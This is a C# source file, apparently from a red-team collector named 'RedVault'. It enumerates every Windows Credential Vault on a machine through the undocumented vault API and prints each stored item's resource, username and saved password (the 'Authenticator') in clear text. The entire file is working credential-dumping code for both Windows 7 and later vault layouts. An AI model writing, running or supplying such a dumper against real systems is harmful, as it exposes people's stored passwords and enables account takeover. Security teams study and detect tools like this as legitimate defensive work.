using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;
using static System.Runtime.InteropServices.JavaScript.JSType;

namespace RedVault.Collectors.Vault
{
    internal class Vault
    {
        public static (VAULT_ELEMENT_TYPE type, object value) GetVaultItemData(IntPtr itemptr)
        {
            var item = Marshal.PtrToStructure<VAULT_ITEM_DATA>(itemptr);

            object value;

            IntPtr dataptr = (IntPtr)(itemptr.ToInt64() + 16);
            
            switch (item.Type)
            {
                case VAULT_ELEMENT_TYPE.Boolean:
                    value = Marshal.ReadByte(dataptr);
                    value = (bool)value;
                    break;
                case VAULT_ELEMENT_TYPE.Short:
                    value = Marshal.ReadInt16(dataptr);
                    break;
                case VAULT_ELEMENT_TYPE.UnsignedShort:
                    value = Marshal.ReadInt16(dataptr);
                    break;
                case VAULT_ELEMENT_TYPE.Int:
                    value = Marshal.ReadInt32(dataptr);
                    break;
                case VAULT_ELEMENT_TYPE.UnsignedInt:
                    value = Marshal.ReadInt32(dataptr);
                    break;
                case VAULT_ELEMENT_TYPE.Double:
                    value = Marshal.PtrToStructure(dataptr, typeof(double));
                    break;
                case VAULT_ELEMENT_TYPE.Guid:
                    value = Marshal.PtrToStructure(dataptr, typeof(Guid));
                    break;
                case VAULT_ELEMENT_TYPE.String:
                    var StringPtr = Marshal.ReadIntPtr(dataptr);
                    value = Marshal.PtrToStringUni(StringPtr);
                    break;
                case VAULT_ELEMENT_TYPE.Sid:
                    var sidPtr = Marshal.ReadIntPtr(dataptr);
                    var sidObject = new System.Security.Principal.SecurityIdentifier(sidPtr);
                    value = sidObject.Value;
                    break;
                case VAULT_ELEMENT_TYPE.ByteArray:
                    var o = (VAULT_BYTE_ARRAY)Marshal.PtrToStructure(dataptr, typeof(VAULT_BYTE_ARRAY));
                    var array = new byte[o.Length];
                    if (o.Length > 0)
                    {
                        Marshal.Copy(o.pData, array, 0, o.Length);
                    }
                    string textValue = System.Text.Encoding.UTF8.GetString(array);
                    value = textValue;
                    break;

                default:
                    throw new NotImplementedException($"VAULT_ELEMENT_TYPE '{item.Type}' is currently not implemented");
            }
            return (item.Type, value);

        }

        public static void Run()
        {

            var result = VaultApi.VaultEnumerateVaults(0, out uint cbItems, out IntPtr vaults);

            if (result != 0)
            {
                Console.WriteLine($"VaultEnumerateVaults failed with error: {result}");
                return;
            }

            for (int i = 0; i < cbItems; i++) 
            {
                IntPtr vaultPtr = IntPtr.Add(vaults, i * Marshal.SizeOf<Guid>());

                Guid guid = Marshal.PtrToStructure<Guid>(vaultPtr);

                Console.WriteLine($"Vault: {guid.ToString()}\n");

                result = VaultApi.VaultOpenVault(guid, 0, out IntPtr hVault);

                if (result != 0)
                {
                    Console.WriteLine($"VaultOpenVault failed with error: {result}");
                    return;
                }

                result = VaultApi.VaultEnumerateItems(hVault, 512, out uint cbvItems, out IntPtr vItems);

                if (result != 0)
                {
                    Console.WriteLine($"VaultEnumerateItems failed with error: {result}");
                    return;
                }

                

                for(int j = 0; j < cbvItems; j++)
                {
                    
                    if(Environment.OSVersion.Version.Build < 9200) // Win7 style vault struct
                    {
                        
                        IntPtr current = IntPtr.Add(vItems, j * Marshal.SizeOf<VAULT_ITEM_7>());
                        VAULT_ITEM_7 items7 = Marshal.PtrToStructure<VAULT_ITEM_7>(current);

                        var vaultpassitem = IntPtr.Zero;
                        result = VaultApi.VaultGetItem_WIN7(hVault, ref items7.SchemaId, items7.Resource, items7.Identity, IntPtr.Zero, 0, ref vaultpassitem);

                        if (result != 0)
                        {
                            Console.WriteLine($"VaultGetItem_WIN7 failed with error: {result}");
                            return;
                        }

                        var passwordItem = Marshal.PtrToStructure<VAULT_ITEM_7>(vaultpassitem);


                        var (typeresoruce, resource) = GetVaultItemData(passwordItem.Resource);
                        var (typereiden, iden) = GetVaultItemData(passwordItem.Identity);
                        var (typeauth, auth) = GetVaultItemData(passwordItem.Authenticator);


                        Console.WriteLine($"Resource: {resource.ToString()}");
                        Console.WriteLine($"Identity: {iden.ToString()}");
                        Console.WriteLine($"Authenticator: {auth.ToString()}");

                        VaultApi.VaultFree(vaultpassitem);
                    }
                    else
                    {

                        IntPtr current = IntPtr.Add(vItems, j * Marshal.SizeOf<VAULT_ITEM_8>());
                        VAULT_ITEM_8 items8 = Marshal.PtrToStructure<VAULT_ITEM_8>(current);

                        var vaultpassitem = IntPtr.Zero;
                        result = VaultApi.VaultGetItem_WIN8(hVault, ref items8.SchemaId, items8.Resource, items8.Identity, items8.PackageSid, IntPtr.Zero, 0, ref vaultpassitem);

                        if (result != 0)
                        {
                            Console.WriteLine($"VaultGetItem_WIN8 failed with error: {result}");
                            return;
                        }

                        var passwordItem = Marshal.PtrToStructure<VAULT_ITEM_8>(vaultpassitem);


                        var (typeresoruce, resource) = GetVaultItemData(passwordItem.Resource);
                        var (typereiden, iden) = GetVaultItemData(passwordItem.Identity);
                        var (typeauth, auth) = GetVaultItemData(passwordItem.Authenticator);


                        Console.WriteLine($"Resource: {resource.ToString()}");
                        Console.WriteLine($"Identity: {iden.ToString()}");
                        Console.WriteLine($"Authenticator: {auth.ToString()}\n");
                        
                        VaultApi.VaultFree(vaultpassitem);
                    }

                    


                }

                VaultApi.VaultFree(vItems);

                VaultApi.VaultCloseVault(ref hVault);
            }





        }



    }
}
